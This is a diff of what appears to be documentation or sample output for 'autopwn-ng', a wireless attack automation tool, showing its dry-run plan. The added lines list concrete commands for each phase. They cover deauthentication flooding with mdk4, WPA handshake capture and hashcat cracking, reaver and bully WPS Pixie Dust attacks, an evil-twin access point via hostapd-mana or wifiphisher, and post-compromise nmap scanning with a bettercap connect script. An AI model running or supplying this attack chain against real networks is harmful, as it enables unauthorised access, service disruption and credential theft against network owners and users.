@@ -188,14 +188,49 @@ SIMULATION MODE: autopwn-ng dry-run / --simulate
 
 Profile: normal
 Capture: 120s
+Workload: 3
 
-Phases (simulation only - no tools will run)
-  [0] Setup: check root, prerequisites, wireless interfaces
-  [1] Capture: hcxdumptool + mdk4 reassociation (echo only)
-  [2] Extract: hcxpcapngtool + hcxhashtool (echo only)
-  [3] Crack: hashcat layers 1-8 (dicts + masks + rules; echo only)
-  [4] WPS: reaver -K Pixie Dust (if AP has WPS; echo only)
-  [5] Evil Twin: hostapd-mana or wifiphisher (echo only)
+═══════════════════════════════════════════════════
+  Planned execution (no tools will run)
+═══════════════════════════════════════════════════
+
+[0] Setup
+    airmon-ng check kill
+    airmon-ng start $IFACE
+
+[1] Capture (120s)
+    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
+    mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
+    airodump-ng --band abg --output-format csv -w $WORK/scan $MON
+    tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
+    tshark -r $CAP -Y 'wps' -T fields -e wlan.bssid
+
+[2] Extract & normalize
+    hcxpcapngtool -o $WORK/raw.hc22000 -E $WORK/essids.txt --eapmschapv2=$WORK/mschapv2.txt $CAP
+    hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
+
+[3] Crack (hashcat layers 0-8)
+    0: cowpatty -r $CAP -f <wordlist> -s <essid>
+    1: hashcat -m 22000 -a 0 $HASH $WORK/dicts/vendor.txt
+    ...
+
+[4] WPS (if DO_WPS and WPS-enabled APs found)
+    wash -i $MON -o $WORK/wps-scan.txt
+    reaver -i $MON -b <bssid> -c <ch> -K 1 -N -vv -d 5
+    bully -b <bssid> -c <ch> -d $WORK/bully-<bssid> $MON
+
+[5] Evil Twin (if no cracks and DO_TWIN)
+    hostapd-mana $WORK/mana.conf  (or wifiphisher)
+    sleep 180
+
+[6] Post-exploit (if cracks found and DO_POST)
+    nmap -sn 192.168.1.0/24
+    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24
+    generate $REPORT/connect.sh (nmcli + bettercap)
+
+[7] Report
+    $REPORT/summary.md
+    $REPORT/summary.json
 
 ✓ Simulation complete. No changes were made.
 ```
